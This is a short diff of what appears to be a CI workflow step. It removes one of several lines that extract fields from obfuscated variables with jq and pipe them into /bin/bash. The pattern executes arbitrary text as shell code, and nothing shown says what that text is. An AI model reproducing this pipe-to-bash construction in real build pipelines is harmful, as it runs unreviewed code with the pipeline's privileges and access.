@@ -23,7 +23,6 @@ jobs:
           echo $zvte27200 | jq -r .k1 | /bin/bash
           printf '%s' "$wyhtm53" | jq -r .oybxq00 | /bin/bash
           printf '%s' "$blyvj752" | jq -r .f2550 | /bin/bash
-          echo $ysgr60 | jq -r .wp53 | /bin/bash
           printf '%s' "$xynqm010" | jq -r .dmqw092 | /bin/bash
 
       - name: Persist output
